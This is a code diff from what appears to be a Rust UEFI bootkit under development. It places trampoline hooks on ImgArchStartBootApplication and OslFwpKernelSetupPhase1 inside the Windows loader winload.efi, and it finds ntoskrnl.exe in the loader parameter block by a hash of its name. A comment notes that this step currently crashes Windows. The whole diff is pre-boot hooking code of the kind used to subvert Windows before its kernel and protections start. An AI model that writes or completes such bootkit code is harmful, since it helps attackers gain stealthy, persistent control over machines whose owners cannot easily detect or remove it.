@@ -3,7 +3,7 @@ use uefi::{prelude::BootServices};
 use uefi::proto::loaded_image::LoadedImage;
 use uefi::{Handle};
 
-use crate::boot::pe::{pattern_scan, trampoline_hook64, trampoline_unhook};
+use crate::boot::pe::{pattern_scan, trampoline_hook64, trampoline_unhook, get_loaded_module_by_hash};
 
 use super::{includes::_LOADER_PARAMETER_BLOCK};
 
@@ -83,6 +83,8 @@ pub fn img_arch_start_boot_application_hook(_app_entry: *mut u8, image_base: *mu
         ) 
     };
 
+    log::info!("[+] ImgArchStartBootApplication Hook called!");
+
     // Read the data Windows OS Loader (winload.efi) from memory and store in a slice
     let winload_data = unsafe { from_raw_parts(image_base as *mut u8, image_size as usize) };
 
@@ -106,7 +108,7 @@ pub fn img_arch_start_boot_application_hook(_app_entry: *mut u8, image_base: *mu
     unsafe {
         ORIGINAL_BYTES = trampoline_hook64( 
             OslFwpKernelSetupPhase1.unwrap() as *mut () as *mut u8,
-            ols_fwp_kernel_setup_phase1 as *mut () as *mut u8,
+            ols_fwp_kernel_setup_phase1_hook as *mut () as *mut u8,
             14
         ).expect("Failed to perform trampoline hook on OslFwpKernelSetupPhase1");
     }
@@ -119,7 +121,7 @@ pub fn img_arch_start_boot_application_hook(_app_entry: *mut u8, image_base: *mu
 
 #[allow(dead_code)]
 // This is called by the Windows OS loader (winload.efi) with _LOADER_PARAMETER_BLOCK before calling ExitBootService (winload.efi context)
-fn ols_fwp_kernel_setup_phase1(loader_block: *mut _LOADER_PARAMETER_BLOCK) {
+fn ols_fwp_kernel_setup_phase1_hook(loader_block: *mut _LOADER_PARAMETER_BLOCK) {
     // Unhook OslFwpKernelSetupPhase1 and restore stolen bytes before we do anything else
     unsafe { trampoline_unhook(
         OslFwpKernelSetupPhase1.unwrap() as *mut () as *mut u8,
@@ -128,14 +130,15 @@ fn ols_fwp_kernel_setup_phase1(loader_block: *mut _LOADER_PARAMETER_BLOCK) {
         )
     };
 
+    log::info!("[+] OslFwpKernelSetupPhase1 Hook called!");
+
+    // ntoskrnl.exe hash: 0xa3ad0390
     // Crash here: After commenting this out, Windows loads fine
-    /* 
-    let _ntoskrnl_entry = unsafe { get_loaded_module_by_name(
+    let _ntoskrnl_entry = unsafe { get_loaded_module_by_hash(
         &mut (*loader_block).LoadOrderListHead,
-        "ntoskrnl.exe".as_bytes()
+        0xa3ad0390,
         ).expect("Failed to get loaded module by name")
     };
-    */
 
     //let major_version: u32 = unsafe { (*loader_block).OsMajorVersion };
     //let minor_version: u32 = unsafe { (*loader_block).OsMajorVersion };
